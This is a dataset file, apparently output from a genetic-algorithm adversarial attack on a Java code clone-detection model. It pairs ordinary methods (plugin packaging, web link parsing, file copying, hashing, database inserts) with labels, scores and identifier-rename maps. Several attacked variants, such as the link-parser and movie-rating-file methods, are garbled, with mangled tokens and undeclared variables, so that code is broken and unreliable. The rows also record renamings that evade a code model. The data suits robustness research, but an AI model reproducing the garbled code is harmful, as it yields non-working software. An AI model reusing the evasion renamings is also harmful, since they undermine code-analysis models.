        description.setNatureIds(new String[] { JavaCore.NATURE_ID, PLUGIN_NATURE_ID });
        project.setDescription(description, new SubProgressMonitor(monitor, 5));
        IJavaProject javaProject = JavaCore.create(project);
        IFolder binDir = project.getFolder(""bin"");
        IPath binPath = binDir.getFullPath();
        javaProject.setOutputLocation(binPath, new SubProgressMonitor(monitor, 5));
        project.getFolder(""jni"").create(true, true, new SubProgressMonitor(monitor, 5));
        project.getFile(""sapjco3.jar"").create(new ByteArrayInputStream(files.get(""sapjco3.jar"")), true, new SubProgressMonitor(monitor, 10));
        IFolder metaInfFolder = project.getFolder(""META-INF"");
        metaInfFolder.create(true, true, new SubProgressMonitor(monitor, 5));
        StringBuilder manifest = new StringBuilder();
        manifest.append(""Manifest-Version: 1.0\n"");
        manifest.append(""Bundle-ManifestVersion: 2\n"");
        manifest.append(""Bundle-Name: SAP Java Connector v3\n"");
        manifest.append(MessageFormat.format(""Bundle-SymbolicName: {0}\n"", pluginName));
        manifest.append(""Bundle-Version: 7.11.0\n"");
        manifest.append(""Bundle-ClassPath: bin/,\n"");
        manifest.append("" sapjco3.jar,\n"");
        manifest.append("" jni/\n"");
        manifest.append(""Bundle-Vendor: SAP AG, Walldorf (packaged using RCER)\n"");
        manifest.append(""Bundle-RequiredExecutionEnvironment: J2SE-1.5\n"");
        manifest.append(""Export-Package: com.sap.conn.jco,\n"");
        manifest.append("" com.sap.conn.jco.ext,\n"");
        manifest.append("" com.sap.conn.jco.monitor,\n"");
        manifest.append("" com.sap.conn.jco.rt,\n"");
        manifest.append("" com.sap.conn.jco.server\n"");
        manifest.append(""Bundle-ActivationPolicy: lazy\n"");
        writeTextFile(monitor, manifest, metaInfFolder.getFile(""MANIFEST.MF""));
        final IPath jcoPath = new Path(MessageFormat.format(""/{0}/sapjco3.jar"", pluginName));
        IClasspathEntry jcoEntry = JavaCore.newLibraryEntry(jcoPath, Path.EMPTY, Path.EMPTY, true);
        final IPath jniPath = new Path(MessageFormat.format(""/{0}/jni"", pluginName));
        IClasspathEntry jniEntry = JavaCore.newLibraryEntry(jniPath, Path.EMPTY, Path.EMPTY, true);
        javaProject.setRawClasspath(new IClasspathEntry[] { jcoEntry, jniEntry }, new SubProgressMonitor(monitor, 5));
        StringBuilder buildProperties = new StringBuilder();
        buildProperties.append(""bin.includes = META-INF/,\\\n"");
        buildProperties.append(""               sapjco3.jar,\\\n"");
        buildProperties.append(""               jni/,\\\n"");
        buildProperties.append(""               .\n"");
        writeTextFile(monitor, buildProperties, project.getFile(""build.properties""));
        exportableBundles.add(modelManager.findModel(project));
    }
",570,"    public Vector ge(String line) {
        addMessage(""Parsing: "" + line);
        links.removeAllElements();
        URLConnection ssl = null;
        Reader rd = null;
        EditorKit nt = new HTMLEditorKit();
        Documentxmlc = nt.createDefaultDocument();
        xml.putProperty(""IgnoreCharsetDirective"", Boolean.TRUE);
        URL file = null;
        try {
            file = new URL(line);
        } catch (MalformedURLException err) {
            System.out.println(""Malformed URL"");
            return links;
        }
        try {
            ssl = new URL(line).openConnection();
           rdd = new InputStreamReader(ssl.getInputStream());
        } catch (Exception err) {
            err.printStackTrace();
            return links;
        }
        try {
            nt.read(rd, xml, 0);
            ElementIterator or = new ElementIterator(xml);
            javax.swing.text.Element Eject;
            while ((Eject = or.next()) != null) {
                SimpleAttributeSet se= (SimpleAttributeSet) Eject.getAttributes().getAttribute(HTML.Tag.A);
                if (e != null) {
                    if (e.toString().indexOf(""script"") >= 0) continue;
                    String nnk = """";
                    try {
                        nnk = e.getAttribute(HTML.Attribute.HREF).toString();
                    } catch (Exception err) {
                        continue;
                    }
                    int J = 0;
                    if ((J = nnk.indexOf('#')) >= 0) nnk = nnk.substring(0, J);
                    URL ufilePath= new URL(file, nnk);
                    if (!file.getHost().equals(filePath.getHost())) continue;
                    String skr= filePath.toString();
                    if (!kr.startsWith(""http"")) continue;
                    if (kr.endsWith("".pdf"")) {
                        continue;
                    }
                    for (int I = 0; I < leaveSuffix.length; I++) {
                        if ((kr.endsWith(leaveSuffix[I]))) continue;
                    }
                    boolean ips = false;
                    for (int I = 0; I < suffix.length; I++) {
                        if ((kr.endsWith(suffix[I]))) ips = true;
                    }
                    if (!ips) {
                        try {
                            ssl = filePath.openConnection();
                        } catch (Exception err) {
                        }
                        String contentType = null;
                        if (contentType == null) contentType = ssl.getContentType();
                        if (contentType.equals(""application/pdf"")) {
                            continue;
                        } else if (!contentType.equals(""text/html"")) {
                            continue;
                        }
                    }
                    if (!links.contains(filePath.toString())) {
                        links.addElement(filePath.toString());
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return links;
    }
",LABEL_0,LABEL_0,0.5058860182762146,1,"parse,link,conn,rd,kit,doc,url,it,elem,s,lnk,j,urlLink,str,i,skip",,,,3,"parse:ge,link:line,conn:ssl,rd:rd,kit:nt,doc:xml,url:file,it:or,elem:Eject,s:e,lnk:nnk,j:J,urlLink:filePath,str:kr,i:I,skip:ips,",1,GA,2090,0.866523027420044,ga,[]
481,"    public static void writeFileType(String uriFile, String outputfile, int num) {
        BufferedWriter writer = null;
        String uri = null;
        try {
            int counter = 1;
            writer = new BufferedWriter(new FileWriter(outputfile));
            BufferedReader reader = new BufferedReader(new FileReader(uriFile));
            uri = null;
            while (counter < num) {
                uri = reader.readLine();
                counter++;
            }
            while ((uri = reader.readLine()) != null) {
                try {
                    System.err.println(""working on the ["" + counter + ""]th document."");
                    counter++;
                    URL url = new URL(uri);
                    URLConnection myConnection = url.openConnection();
                    BufferedReader myReader = new BufferedReader(new InputStreamReader(myConnection.getInputStream()));
                    String line = null;
                    boolean hasOWL = false;
                    boolean hasRDFS = false;
                    boolean hasRDF = false;
                    int linecount = 0;
                    while ((line = myReader.readLine()) != null) {
                        if (line.indexOf(""http://www.w3.org/2002/07/owl"") != -1) hasOWL = true; else if (line.indexOf(""http://www.w3.org/2000/01/rdf-schema"") != -1) hasRDFS = true; else if (line.indexOf(""http://www.w3.org/1999/02/22-rdf-syntax-ns"") != -1) hasRDF = true;
                        linecount++;
                        if (linecount > 100) break;
                    }
                    if (hasOWL) writer.write(uri + ""\t"" + OWL); else if (hasRDFS) writer.write(uri + ""\t"" + RDFS); else if (hasRDF) writer.write(uri + ""\t"" + RDF); else writer.write(uri + ""\t"" + UNKNOWN);
                    writer.newLine();
                    writer.flush();
                } catch (Exception e) {
                    e.printStackTrace();
                    try {
                        writer.write(uri + ""\t"" + BROKEN);
                        writer.newLine();
                        writer.flush();
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     public static void addRecipe(String name, String instructions, int categoryId, String[][] ainekset) throws Exception {
        PreparedStatement pst1 = null;
        PreparedStatement pst2 = null;
        ResultSet rs = null;
        int retVal = -1;
        try {
            pst1 = conn.prepareStatement(""INSERT INTO recipes (name, instructions, category_id) VALUES (?, ?, ?)"");
            pst1.setString(1, name);
            pst1.setString(2, instructions);
            pst1.setInt(3, categoryId);
            if (pst1.executeUpdate() > 0) {
                pst2 = conn.prepareStatement(""SELECT recipe_id FROM recipes WHERE name = ? AND instructions = ? AND category_id = ?"");
                pst2.setString(1, name);
                pst2.setString(2, instructions);
                pst2.setInt(3, categoryId);
                rs = pst2.executeQuery();
                if (rs.next()) {
                    int id = rs.getInt(1);
                    System.out.println(""Lis�t��n ainesosat"");
                    String[] aines;
                    for (int i = 0; i < ainekset.length; ++i) {
                        aines = ainekset[i];
                        addIngredient(id, aines[0], aines[1], Integer.parseInt(aines[2]), Integer.parseInt(aines[3]));
                    }
                    retVal = id;
                } else {
                    retVal = -1;
                }
            } else {
                retVal = -1;
            }
            conn.commit();
        } catch (Exception e) {
            conn.rollback();
            throw new Exception(""Reseptin lis�ys ep�onnistui. Poikkeus: "" + e.getMessage());
        }
    }
",411,,LABEL_0,LABEL_0,LABEL_0,-1,"writeFileType,uriFile,outputfile,num,writer,uri,counter,reader,url,myConnection,myReader,line,linecount,hasOWL,hasRDFS,hasRDF",,,,0,,0,GA,5915,2.2709352850914,failed,[]
482,"    protected String downloadURLtoString(URL url) throws IOException {
        BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
        StringBuffer sb = new StringBuffer(100 * 1024);
        String str;
        while ((str = in.readLine()) != null) {
            sb.append(str);
        }
        in.close();
        return sb.toString();
    }
 <SPLIT>     private boolean getWave(String url, String Word) {
        try {
            File FF = new File(f.getParent() + ""/"" + f.getName() + ""pron"");
            FF.mkdir();
            URL url2 = new URL(url);
            BufferedReader stream = new BufferedReader(new InputStreamReader(url2.openStream()));
            File Fdel = new File(f.getParent() + ""/"" + f.getName() + ""pron/"" + Word + "".wav"");
            if (!Fdel.exists()) {
                FileOutputStream outstream = new FileOutputStream(f.getParent() + ""/"" + f.getName() + ""pron/"" + Word + "".wav"");
                BufferedWriter bwriter = new BufferedWriter(new OutputStreamWriter(outstream));
                char[] binput = new char[1024];
                int len = stream.read(binput, 0, 1024);
                while (len > 0) {
                    bwriter.write(binput, 0, len);
                    len = stream.read(binput, 0, 1024);
                }
                bwriter.close();
                outstream.close();
            }
            stream.close();
        } catch (Exception e) {
            System.out.println(e.getMessage());
            return false;
        }
        return true;
    }
",80,,LABEL_0,LABEL_0,LABEL_0,-1,"downloadURLtoString,url,in,sb,str",,,,0,,0,GA,1918,0.6818314989407858,failed,[]
483,"    @Override
    public void trainClassifier(File dir, String... args) throws Exception {
        String[] command = new String[args.length + 3];
        command[0] = this.getCommand();
        System.arraycopy(args, 0, command, 1, args.length);
        command[command.length - 2] = new File(dir, ""training-data.libsvm"").getPath();
        command[command.length - 1] = new File(dir, this.getModelName()).getPath();
        Process process = Runtime.getRuntime().exec(command);
        IOUtils.copy(process.getInputStream(), System.out);
        IOUtils.copy(process.getErrorStream(), System.err);
        process.waitFor();
    }
 <SPLIT>     public static void createTar(File directoryToPack, File targetTarFile) throws IOException {
        if (directoryToPack == null) {
            throw new NullPointerException(""The parameter 'directoryToPack' must not be null"");
        }
        if (targetTarFile == null) {
            throw new NullPointerException(""The parameter 'targetTarFile' must not be null"");
        }
        if (!directoryToPack.exists() || !directoryToPack.isDirectory()) {
            throw new IllegalArgumentException(""The target file '"" + directoryToPack + ""' does not exist or is not a directory."");
        }
        if (targetTarFile.exists()) {
            log.warn(""The target file '"" + targetTarFile + ""' already exists. Will overwrite"");
        }
        log.debug(""Creating tar from all files in directory '"" + directoryToPack + ""'"");
        byte buffer[] = new byte[BUFFER_SIZE];
        FileOutputStream targetOutput = new FileOutputStream(targetTarFile);
        TarOutputStream targetOutputTar = new TarOutputStream(targetOutput);
        try {
            List<File> fileList = collectFiles(directoryToPack);
            for (Iterator<File> iter = fileList.iterator(); iter.hasNext(); ) {
                File file = iter.next();
                if (file == null || !file.exists() || file.isDirectory()) {
                    log.info(""The file '"" + file + ""' is ignored - is a directory or non-existent"");
                    continue;
                }
                if (file.equals(targetTarFile)) {
                    log.debug(""Skipping file: '"" + file + ""' - is the tar file itself"");
                    continue;
                }
                log.debug(""Adding to archive: file='"" + file + ""', archive='"" + targetTarFile + ""'"");
                String filePathInTar = getFilePathInTar(file, directoryToPack);
                log.debug(""File path in tar: '"" + filePathInTar + ""' (file="" + file + "")"");
                TarEntry tarAdd = new TarEntry(file);
                tarAdd.setModTime(file.lastModified());
                tarAdd.setName(filePathInTar);
                targetOutputTar.putNextEntry(tarAdd);
                if (file.isFile()) {
                    FileInputStream in = new FileInputStream(file);
                    try {
                        while (true) {
                            int nRead = in.read(buffer, 0, buffer.length);
                            if (nRead <= 0) break;
                            targetOutputTar.write(buffer, 0, nRead);
                        }
                    } finally {
                        StreamUtil.tryCloseStream(in);
                    }
                }
                targetOutputTar.closeEntry();
            }
        } finally {
            StreamUtil.tryCloseStream(targetOutputTar);
            StreamUtil.tryCloseStream(targetOutput);
        }
        log.info(""Tar Archive created successfully '"" + targetTarFile + ""'"");
    }
",159,,LABEL_1,LABEL_1,LABEL_1,-1,"trainClassifier,dir,command,length,process",,,,0,,0,GA,1643,0.6125267545382181,failed,[]
484,"    public static byte[] fetchURLData(String url, String proxyHost, int proxyPort) throws IOException {
        HttpURLConnection con = null;
        InputStream is = null;
        try {
            URL u = new URL(url);
            if (url.startsWith(""file://"")) {
                is = new BufferedInputStream(u.openStream());
            } else {
                Proxy proxy;
                if (proxyHost != null) {
                    proxy = new Proxy(Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
                } else {
                    proxy = Proxy.NO_PROXY;
                }
                con = (HttpURLConnection) u.openConnection(proxy);
                con.addRequestProperty(""User-Agent"", ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"");
                con.addRequestProperty(""Accept-Charset"", ""UTF-8"");
                con.addRequestProperty(""Accept-Language"", ""en-US,en"");
                con.addRequestProperty(""Accept"", ""text/html,image/*"");
                con.setDoInput(true);
                con.setDoOutput(false);
                con.connect();
                is = new BufferedInputStream(con.getInputStream());
            }
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            IOUtils.copy(is, baos);
            return baos.toByteArray();
        } finally {
            IOUtils.closeQuietly(is);
            if (con != null) {
                con.disconnect();
            }
        }
    }
 <SPLIT>     public static void copyFile(File src, File dest) throws IOException {
        FileInputStream fis = new FileInputStream(src);
        FileOutputStream fos = new FileOutputStream(dest);
        java.nio.channels.FileChannel channelSrc = fis.getChannel();
        java.nio.channels.FileChannel channelDest = fos.getChannel();
        channelSrc.transferTo(0, channelSrc.size(), channelDest);
        fis.close();
        fos.close();
    }
",253,,LABEL_1,LABEL_1,LABEL_1,-1,"fetchURLData,url,proxyHost,proxyPort,con,is,u,proxy,baos",,,,0,,0,GA,3250,1.176521082719167,failed,[]
485,"    private static boolean genCustRatingFileAndMovieIndexFile(String completePath, String masterFile, String CustRatingFileName, String MovieIndexFileName) {
        try {
            File inFile = new File(completePath + fSep + ""SmartGRAPE"" + fSep + masterFile);
            FileChannel inC = new FileInputStream(inFile).getChannel();
            File outFile1 = new File(completePath + fSep + ""SmartGRAPE"" + fSep + MovieIndexFileName);
            FileChannel outC1 = new FileOutputStream(outFile1, true).getChannel();
            File outFile2 = new File(completePath + fSep + ""SmartGRAPE"" + fSep + CustRatingFileName);
            FileChannel outC2 = new FileOutputStream(outFile2, true).getChannel();
            int fileSize = (int) inC.size();
            int totalNoDataRows = fileSize / 7;
            ByteBuffer mappedBuffer = inC.map(FileChannel.MapMode.READ_ONLY, 0, fileSize);
            int startIndex = 1, count = 0;
            short currentMovie = 1;
            while (mappedBuffer.hasRemaining()) {
                count++;
                short movieName = mappedBuffer.getShort();
                int customer = mappedBuffer.getInt();
                byte rating = mappedBuffer.get();
                if (movieName != currentMovie) {
                    ByteBuffer outBuf1 = ByteBuffer.allocate(10);
                    outBuf1.putShort(currentMovie);
                    outBuf1.putInt(startIndex);
                    outBuf1.putInt(count - 1);
                    outBuf1.flip();
                    outC1.write(outBuf1);
                    currentMovie = movieName;
                    startIndex = count;
                }
                ByteBuffer outBuf2 = ByteBuffer.allocate(5);
                outBuf2.putInt(customer);
                outBuf2.put(rating);
                outBuf2.flip();
                outC2.write(outBuf2);
            }
            ByteBuffer endOfIndexFile = ByteBuffer.allocate(10);
            endOfIndexFile.putShort(currentMovie);
            endOfIndexFile.putInt(startIndex);
            endOfIndexFile.putInt(100480506);
            endOfIndexFile.flip();
            outC1.write(endOfIndexFile);
            outC1.close();
            outC2.close();
            return true;
        } catch (IOException e) {
            System.err.println(e);
            return false;
        }
    }
 <SPLIT>     private static void doCopyFile(File srcFile, File destFile, boolean preserveFileDate) throws IOException {
        if (destFile.exists() && destFile.isDirectory()) {
            throw new IOException(""Destination '"" + destFile + ""' exists but is a directory"");
        }
        FileChannel input = new FileInputStream(srcFile).getChannel();
        try {
            FileChannel output = new FileOutputStream(destFile).getChannel();
            try {
                output.transferFrom(input, 0, input.size());
            } finally {
                IOUtil.closeQuietly(output);
            }
        } finally {
            IOUtil.closeQuietly(input);
        }
        if (srcFile.length() != destFile.length()) {
            throw new IOException(""Failed to copy full contents from '"" + srcFile + ""' to '"" + destFile + ""'"");
        }
        if (preserveFileDate) {
            destFile.setLastModified(srcFile.lastModified());
        }
    }
",391,"    private static boolean genCustRatingFileAndMovieLinkFiles(String execPath, String MasterFiles, String CustRatingFilesSize, String MovieIndexFolderName) {
        try {
            Fi inFile = new File(execPath + fSep + ""SmartGRAPE"" + fSep + MasterFiles);
            FileChanne inFnC = new FileInputStream( inF).getChannel();
            FiloutPath3e1 = new File(execPath + fSep + ""SmartGRAPE"" + fSep + MovieIndexFolderName);
            FileChannel outD2 = new FileOutputStream(outPath3, true).getChannel();
            FioutChannel6le2 = new File(execPath + fSep + ""SmartGRAPE"" + fSep + CustRatingFilesSize);
            FileChannel outagainCTwonew FileOutputStream(outChannel6, true).getChannel();
            int fresourceSIZE= (int)  inF.size();
            int totatotalNoPageLrowsesourceSIZE / 7;
            ByteBuffer mappemachedURLnF.map(FileChannel.MapMode.READ_ONLY, 0, resourceSIZE);
            int startingSection = 1, name = 0;
            short thisMovie = 1;
            while (machedURL.hasRemaining()) {
                name++;
                shomoneyNumberame = machedURL.getShort();
                imixormer = machedURL.getInt();
                byurling = machedURL.get();
                imoneyNumberame != thisMovie) {
                    ByteBuffer outBiff91 = ByteBuffer.allocate(10);
                 outBiff91uf1.putShort(thisMovie);
                    outBuoutBiff91nt(startingSection);
                   outBiff911.putInt(name - 1);
                    outBiff91.flip();
                    outD2.write(outBiff91);
                    thisMovie = moneyNumber;
                    startingSection = name;
                }
                ByteBuffer outBbuff1 = ByteBuffer.allocate(5);
             outBbuff1uf2.putInt(mixor);
             outBbuff1uf2.put(url);
                outBbuff1.flip();
                againCTwo.write(outBbuff1);
            }
            ByteBuffer endofIndexTime = ByteBuffer.allocate(10);
         endofIndexTimeile.putShort(thisMovie);
            endOfendofIndexTiment(startingSection);
            endofIndexTime.putInt(100480506);
            endofIndexTime.flip();
            outD2.write(endofIndexTime);
            outD2.close();
            againCTwo.close();
            return true;
        } catch (IOException e) {
            System.err.println(e);
            return false;
        }
    }
",LABEL_1,LABEL_1,0.566020667552948,1,"genCustRatingFileAndMovieIndexFile,completePath,masterFile,CustRatingFileName,MovieIndexFileName,inFile,inC,outFile1,outC1,outFile2,outC2,fileSize,totalNoDataRows,mappedBuffer,startIndex,count,currentMovie,movieName,customer,rating,outBuf1,outBuf2,endOfIndexFile",,,,0,"genCustRatingFileAndMovieIndexFile:genCustRatingFileAndMovieLinkFiles,completePath:execPath,masterFile:MasterFiles,CustRatingFileName:CustRatingFilesSize,MovieIndexFileName:MovieIndexFolderName,inFile: inF,inC: inF,outFile1:outPath3,outC1:outD2,outFile2:outChannel6,outC2:againCTwo,fileSize:resourceSIZE,totalNoDataRows:totalNoPageLrows,mappedBuffer:machedURL,startIndex:startingSection,count:name,currentMovie:thisMovie,movieName:moneyNumber,customer:mixor,rating:url,outBuf1:outBiff91,outBuf2:outBbuff1,endOfIndexFile:endofIndexTime,",0,GA,7521,2.8353225032488507,ga,[]
486,"    public static String getMD5(String s) {
        try {
            MessageDigest m = MessageDigest.getInstance(""MD5"");
            m.update(s.getBytes(), 0, s.length());
            return """" + new BigInteger(1, m.digest()).toString(16);
        } catch (NoSuchAlgorithmException e) {
            logger.error(""MD5 is not supported !!!"");
        }
        return s;
    }
 <SPLIT>     public static String postRequest(String urlString, HashMap data) {
        String returnData = """";
        try {
            URL url = new URL(urlString);
            URLConnection connection = url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            PrintWriter out = new PrintWriter(connection.getOutputStream());
            Object[] keySet = data.keySet().toArray();
            Object[] values = data.values().toArray();
            for (int count = 0; count < keySet.length; count++) {
                out.print(URLEncoder.encode((String) keySet[count]) + ""="" + URLEncoder.encode((String) values[count]));
                if ((count + 1) < keySet.length) out.print(""&"");
            }
            out.close();
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                returnData += inputLine;
            }
            in.close();
        } catch (Exception e) {
            e.printStackTrace();
            returnData = null;
        }
        return (returnData);
    }
",85,,LABEL_0,LABEL_0,LABEL_0,-1,"getMD5,s,m",,,,0,,0,GA,923,0.3316577752431234,failed,[]
487,"    public static String installOvalDefinitions(final String xml_location) {
        InputStream in_stream = null;
        try {
            URL url = _toURL(xml_location);
            if (url == null) {
                in_stream = new FileInputStream(xml_location);
            } else {
                in_stream = url.openStream();
            }
        } catch (IOException ex) {
            throw new OvalException(ex);
        }
        Class<OvalDefinitions> type = OvalDefinitions.class;
        OvalDefinitions object = _unmarshalObject(type, in_stream);
        String pid = _getDatastore().save(type, object);
        return pid;
    }
 <SPLIT>     public void run() {
        URL url;
        try {
            url = new URL(""http://localhost:8080/glowaxes/dailytrend.jsp"");
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            while ((str = in.readLine()) != null) {
            }
            in.close();
        } catch (MalformedURLException e) {
        } catch (IOException e) {
        }
    }
",106,,LABEL_0,LABEL_0,LABEL_0,-1,"installOvalDefinitions,xml_location,in_stream,url,type,object,pid",,,,0,,0,GA,2056,0.7301289995511373,failed,[]
488,"    private Reader getReader() throws IOException {
        if (data != null) {
            if (url != null) throw new IllegalArgumentException(""URL for source data and the data itself must never be specified together."");
            if (charset != null) throw new IllegalArgumentException(""Charset has sense only for URL-based data"");
            return new StringReader(data);
        } else if (url != null) {
            InputStream stream = url.openStream();
            if (charset == null) return new InputStreamReader(stream); else return new InputStreamReader(stream, charset);
        }
        return null;
    }
 <SPLIT>     public static String generate(String text) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md;
        md = MessageDigest.getInstance(""SHA-1"");
        byte[] sha1hash = new byte[40];
        md.update(text.getBytes(""iso-8859-1""), 0, text.length());
        sha1hash = md.digest();
        return convertToHex(sha1hash);
    }
",99,,LABEL_0,LABEL_0,LABEL_0,-1,"getReader,stream",,,,0,,0,GA,813,0.28761058251063026,failed,[]
489,"    public void transport(File file) throws TransportException {
        if (file.exists()) {
            if (file.isDirectory()) {
                File[] files = file.listFiles();
                for (int i = 0; i < files.length; i++) {
                    transport(file);
                }
            } else if (file.isFile()) {
                try {
                    FileChannel inChannel = new FileInputStream(file).getChannel();
                    FileChannel outChannel = new FileOutputStream(destinationDir).getChannel();
                    inChannel.transferTo(0, inChannel.size(), outChannel);
                } catch (IOException e) {
                    log.error(""File transfer failed"", e);
                }
            }
        }
    }
 <SPLIT>     private static void copyFile(File source, File dest) throws IOException {
        FileChannel srcChannel = new FileInputStream(source).getChannel();
        FileChannel dstChannel = new FileOutputStream(dest).getChannel();
        dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        srcChannel.close();
        dstChannel.close();
    }
",139,"    public void transport(File url) throws TransportException {
        if (url.exists()) {
            if (url.isDirectory()) {
                File[]filess = url.listFiles();
                for (int i = 0; i < files.length; i++) {
                    transport(url);
                }
            } else if (url.isFile()) {
                try {
                    FileChannelinChannell = new FileInputStream(url).getChannel();
                    FileChannel ioChannel = new FileOutputStream(destinationDir).getChannel();
                    inChannel.transferTo(0, inChannel.size(), ioChannel);
                } catch (IOException e) {
                    log.error(""File transfer failed"", e);
                }
            }
        }
    }
",LABEL_1,LABEL_1,0.5577126145362854,1,"transport,file,files,i,inChannel,outChannel",,,,10,"transport:transport,file:url,files:files,i:i,inChannel:inChannel,outChannel:ioChannel,",4,GA,279,0.09999281565348307,ga,[]
490,"    public Document getContentAsDocument() {
        synchronized (this.url) {
            URLConnection connection = this.url.openConnection();
            if (doReload(connection)) {
                InputSource inputSource = new InputSource(connection.getInputStream());
                DocumentBuilderFactory factory = new DocumentBuilderFactoryImpl();
                this.document = factory.newDocumentBuilder().parse(inputSource);
            }
            return this.document;
        }
    }
 <SPLIT>     @Override
    public void makeRead(final String user, final long databaseID, final long time) throws SQLException {
        final String query = ""insert into fs.read_post (post, user, read_date) values (?, ?, ?)"";
        ensureConnection();
        final PreparedStatement statement = m_connection.prepareStatement(query);
        try {
            statement.setLong(1, databaseID);
            statement.setString(2, user);
            statement.setTimestamp(3, new Timestamp(time));
            final int count = statement.executeUpdate();
            if (0 == count) {
                throw new SQLException(""Nothing updated."");
            }
            m_connection.commit();
        } catch (final SQLException e) {
            m_connection.rollback();
            throw e;
        } finally {
            statement.close();
        }
    }
",77,,LABEL_0,LABEL_0,LABEL_0,-1,"getContentAsDocument,connection,inputSource,factory,document",,,,0,,0,GA,1665,0.5900176207224528,failed,[]
491,"    private static void recurseFiles(File root, File file, ZipArchiveOutputStream zaos, boolean absolute) throws IOException {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            for (File file2 : files) {
                recurseFiles(root, file2, zaos, absolute);
            }
        } else if ((!file.getName().endsWith("".zip"")) && (!file.getName().endsWith("".ZIP""))) {
            String filename = null;
            if (absolute) {
                filename = file.getAbsolutePath().substring(root.getAbsolutePath().length());
            } else {
                filename = file.getName();
            }
            ZipArchiveEntry zae = new ZipArchiveEntry(filename);
            zae.setSize(file.length());
            zaos.putArchiveEntry(zae);
            FileInputStream fis = new FileInputStream(file);
            IOUtils.copy(fis, zaos);
            zaos.closeArchiveEntry();
        }
    }
 <SPLIT>     public void runDynusT(final boolean cleanUp) {
        final String[] exeFiles = new String[] { ""DynusT.exe"", ""DLL_ramp.dll"", ""Ramp_Meter_Fixed_CDLL.dll"", ""Ramp_Meter_Feedback_CDLL.dll"", ""Ramp_Meter_Feedback_FDLL.dll"", ""libifcoremd.dll"", ""libmmd.dll"", ""Ramp_Meter_Fixed_FDLL.dll"", ""libiomp5md.dll"" };
        final String[] modelFiles = new String[] { ""network.dat"", ""scenario.dat"", ""control.dat"", ""ramp.dat"", ""incident.dat"", ""movement.dat"", ""vms.dat"", ""origin.dat"", ""destination.dat"", ""StopCap4Way.dat"", ""StopCap2Way.dat"", ""YieldCap.dat"", ""WorkZone.dat"", ""GradeLengthPCE.dat"", ""leftcap.dat"", ""system.dat"", ""output_option.dat"", ""bg_demand_adjust.dat"", ""xy.dat"", ""TrafficFlowModel.dat"", ""parameter.dat"" };
        log.info(""Creating iteration-directory..."");
        File iterDir = new File(this.tmpDir);
        if (!iterDir.exists()) {
            iterDir.mkdir();
        }
        log.info(""Copying application files to iteration-directory..."");
        for (String filename : exeFiles) {
            log.info(""  Copying "" + filename);
            IOUtils.copyFile(new File(this.dynusTDir + ""/"" + filename), new File(this.tmpDir + ""/"" + filename));
        }
        log.info(""Copying model files to iteration-directory..."");
        for (String filename : modelFiles) {
            log.info(""  Copying "" + filename);
            IOUtils.copyFile(new File(this.modelDir + ""/"" + filename), new File(this.tmpDir + ""/"" + filename));
        }
        for (File f : new File(this.modelDir).listFiles()) {
            if (f.getName().toLowerCase(Locale.ROOT).endsWith("".dws"")) {
                log.info(""  Copying "" + f.getName());
                IOUtils.copyFile(f, new File(this.tmpDir + ""/"" + f.getName()));
            }
        }
        String logfileName = this.tmpDir + ""/dynus-t.log"";
        String cmd = this.tmpDir + ""/DynusT.exe"";
        log.info(""running command: "" + cmd + "" in directory "" + this.tmpDir);
        int timeout = 7200;
        int exitcode = ExeRunner.run(cmd, logfileName, timeout, this.tmpDir);
        if (exitcode != 0) {
            throw new RuntimeException(""There was a problem running Dynus-T. exit code: "" + exitcode);
        }
        if (cleanUp) {
            for (String filename : exeFiles) {
                log.info(""  Deleting "" + filename);
                new File(this.tmpDir + ""/"" + filename).delete();
            }
        }
    }
",194,,LABEL_1,LABEL_1,LABEL_1,-1,"recurseFiles,root,file,zaos,absolute,files,file2,filename,zae,fis",,,,0,,0,GA,3695,1.384878404935201,failed,[]
492,"    public static String fromHtml(URL url, String defaultEncoding, boolean overrideEncoding) throws IOException, BadDocumentException {
        URLConnection conn = url.openConnection();
        String contentType = conn.getContentType();
        String encoding = conn.getContentEncoding();
        if (encoding == null) {
            int i = contentType.indexOf(""charset"");
            if (i >= 0) {
                String s = contentType.substring(i);
                i = s.indexOf('=');
                if (i >= 0) {
                    s = contentType.substring(i + 1).trim();
                    encoding = s.replace(""\'"", """").replace(""\"""", """").trim();
                    if (encoding.equals("""")) {
                        encoding = defaultEncoding;
                    }
                }
            } else {
                encoding = defaultEncoding;
            }
        }
        String expected = ""text/html"";
        if (contentType == null) {
            DefaultXMLNoteErrorHandler.warning(null, 90190, ""Returned content type for url.openConnection() is null"");
            contentType = expected;
        }
        int index = contentType.indexOf(';');
        if (index >= 0) {
            contentType = contentType.substring(0, index).trim();
        }
        if (!contentType.equals(expected)) {
            String msg = translator.translate(""The content type of url '%s' is not '%s', it is '%s'"");
            throw new BadDocumentException(String.format(msg, url.toString(), expected, contentType));
        }
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), encoding));
        return fromHtml(in, encoding);
    }
 <SPLIT>     protected File getFile() throws IOException {
        File home = new File(System.getProperty(""user.dir""));
        String fileName = String.format(""%s.txt"", getFilePrefix());
        File file = new File(home, fileName);
        if (file.exists()) {
            return file;
        } else {
            URL url = LocalNameGenerator.class.getResource(""/"" + fileName);
            if (url == null) {
                throw new IllegalStateException(String.format(""Cannot find resource at %s"", fileName));
            } else {
                InputStream in = url.openStream();
                try {
                    BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(file));
                    try {
                        IOUtils.copy(in, out);
                    } finally {
                        out.close();
                    }
                } finally {
                    in.close();
                }
                return file;
            }
        }
    }
",307,,LABEL_0,LABEL_0,LABEL_0,-1,"fromHtml,url,defaultEncoding,overrideEncoding,conn,contentType,encoding,i,s,expected,index,msg,in",,,,0,,0,GA,4827,1.7699051022529602,failed,[]
